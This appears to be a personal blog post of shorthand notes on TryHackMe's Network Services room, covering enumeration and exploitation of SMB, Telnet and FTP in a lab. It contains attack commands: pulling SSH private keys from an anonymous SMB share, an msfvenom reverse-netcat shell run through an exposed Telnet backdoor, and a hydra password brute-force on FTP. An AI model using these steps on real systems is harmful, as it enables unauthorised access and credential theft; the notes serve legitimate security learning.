---
title: TryHackMe Network Services Room Notes
author: Mr Ash
type: "post"
published: 2022-03-19
lastUpdated: 2022-11-04
url: "/tryhackme-network-services-room-notes/"
image: https://p146.p4.n0.cdn.getcloudapp.com/items/KouA4YvJ/331dec0f-80dc-47ec-9428-c672af0e39da.jpeg?v=46de36c361b702350d16fc33ad8023eb
categories: Cyber
tags:
    - Networking
    - Linux
    - TryHackMe
    - SMB
    - FTP
    - Telnet
---

Are you going through TryHackMe’s Network Services 1 Room? Need help taking notes? I got you covered. Here are my Network Services 1 room notes from TryHackMe, use them as much as you need!

*Disclaimer, this is written in shorthand format, meaning, full sentences and proper grammar are not always used. For writeups, see [SMB Part 1](https://mrash.co/tryhackme-network-services-walkthrough-smb-part-1-3/), for help with Linux, see [Quick Start Guide](https://mrash.co/linux-quick-start-guide/).*

## SMB: Understanding, Enumerating, Exploiting

Server Message Block (SMB) Protocol: client/server comms for file/printer/serial ports/others for MS Windows.

- Type: response-request protocol, transmits multiple messages to est connection.
- Connections: TCP/IP (NetBIOS, NetBEUI, IPX/SPX).
- SMB Commands (SMBs): if est connection, share files etc.
- Support: Samba (open source server) by UNIX.

<!-- <div class="elementor elementor-5269" data-elementor-id="5269" data-elementor-type="section"><div class="elementor-section-wrap"> <section class="elementor-section elementor-top-section elementor-element elementor-element-650fe30 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-element_type="section" data-id="650fe30" data-particle-mobile-disabled="false" data-particle_enable="false" data-settings="{"ekit_has_onepagescroll_dot":"yes"}"><div class="elementor-container elementor-column-gap-default"><div class="elementor-row"><div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-19d1b1d" data-element_type="column" data-id="19d1b1d"><div class="elementor-column-wrap elementor-element-populated"><div class="elementor-widget-wrap"> <section class="elementor-section elementor-inner-section elementor-element elementor-element-75001c1 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-element_type="section" data-id="75001c1" data-particle-mobile-disabled="false" data-particle_enable="false" data-settings="{"ekit_has_onepagescroll_dot":"yes"}"><div class="elementor-container elementor-column-gap-default"><div class="elementor-row"><div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-2d39fa8" data-element_type="column" data-id="2d39fa8" data-settings="{"background_background":"gradient"}"><div class="elementor-column-wrap elementor-element-populated"><div class="elementor-background-overlay"></div><div class="elementor-widget-wrap"><div class="elementor-element elementor-element-87a745b elementor-position-right elementor-vertical-align-middle elementor-view-default elementor-mobile-position-top elementor-widget elementor-widget-icon-box" data-element_type="widget" data-id="87a745b" data-settings="{"ekit_we_effect_on":"none"}" data-widget_type="icon-box.default"><div class="elementor-widget-container"><div class="elementor-icon-box-wrapper"><div class="elementor-icon-box-icon"> <span class="elementor-icon elementor-animation-">  </span> </div><div class="elementor-icon-box-content"> <span> **Free Checklist:** Hacker's Learning Path </span> -->

 Offline checklist to track your learning path, become a great hacker and stay on task.

 <!-- </div> </div> </div> </div><div class="elementor-element elementor-element-96a5f87 elementor-tablet-button-align-stretch elementor-button-align-stretch elementor-widget elementor-widget-form" data-element_type="widget" data-id="96a5f87" data-settings="{"button_width":"25","step_next_label":"Next","step_previous_label":"Previous","step_type":"number_text","step_icon_shape":"circle","ekit_we_effect_on":"none"}" data-widget_type="form.default"><div class="elementor-widget-container"> <form class="elementor-form" method="post" name="CTA - Hackers Checklist"> <input name="post_id" type="hidden" value="5269"></input> <input name="form_id" type="hidden" value="96a5f87"></input> <input name="referer_title" type="hidden" value=""></input><div class="elementor-form-fields-wrapper elementor-labels-"><div class="elementor-field-type-email elementor-field-group elementor-column elementor-field-group-email elementor-col-75 elementor-md-80 elementor-field-required"> <label class="elementor-field-label elementor-screen-only" for="form-field-email"> Email </label> <input aria-required="true" class="elementor-field elementor-size-xs  elementor-field-textual" id="form-field-email" name="form_fields[email]" placeholder="Enter Email Here" required="required" size="1" type="email"></input> </div><div class="elementor-field-group elementor-column elementor-field-type-submit elementor-col-25 e-form__buttons"> <button class="elementor-button elementor-size-xs" type="submit"> <span> <span class=" elementor-button-icon"> </span> <span class="elementor-button-text">Get</span> </span> </button> </div> </div> </form> </div> </div> </div> </div> </div> </div> </div> </section> </div> </div> </div> </div> </div> </section> </div> </div>Enumeration: process of gathering info, `enum4linux`. -->

- Install (ubuntu): `enum4linux`
    1. `git clone <github URL>`
    2. `mv enum4linux.pl /usr/bin`
    3. `apt install smbclient`
- Access: `smbclient`
    1. `smbclient -U Anonymous //<ip>/profiles`
    2. `ls`, `more "Working...txt"`
    3. `cd .ssh`, `ls`, `mget id_rsa*`
    4. `chmod 600 id_rsa cactus@<ip>`

## Telnet: Understanding, Enumerating, Exploiting

Telnet: app protocol, connects/executes commands, non-secure clear text, replaced by ssh e.g. `telnet <ip> <port>`.

- Enumeration: dosen’t ‘jump out’ at us.
    1. `sudo nmap -vv -T4 -p- <ip>`
    2. `nmap -vv -A -p 8012 <ip>`
    3. `s****** b******`
- CVE (Common Vuln and Exposures): listed public sec flaws, with IDs.
- Shell: code/program to gain code/command execution.
- Reverse Shell: target comms back to attack device, target has listening port.
    1. `telnet <ip> <port>` | `CTRL + ]` closes telnet.
    2. `sudo tcpdump ip proto icmp -i tun0`
    3. `.RUN ping <my ip> -c 1`
    4. `msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R`
    5. `nc -lvp 4444`
    6. `.RUN <payload>`

## FTP: Understanding, Enumerating, Exploiting

File Transfer Protocol, allows remote (client/server) files transfers.

- Two Channels: 1) command/control, transmits commands/replies, 2) data, transfers actual data.
- Modes:
    - Active: client opens/listens, server actively connects.
    - Passive: server opens/listens, client connects.
- Enumeration
    1. `nmap -vv -T4 -Pn -p- <ip>` &amp; `nmap -vv -A -p 21 <ip>`
    2. `ftp <ip>`, `anonymous`, `ls`, `more PUBLIC_NOTICE.txt`
- Exploit: command/data channels unencrypted
    1. `hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt.gz -vV <ip> ftp`

This is Day 42 of [\#100DaysOfHacking](https://mrash.co/100daysofhacking/), subscribe to my [newsletter](https://go.mrash.co/newsletter) to see the CyberSec journey! If you like, follow the [Learning Path](https://mrash.co/learning-path-for-beginner-hacker/) for yourself, happy hacking.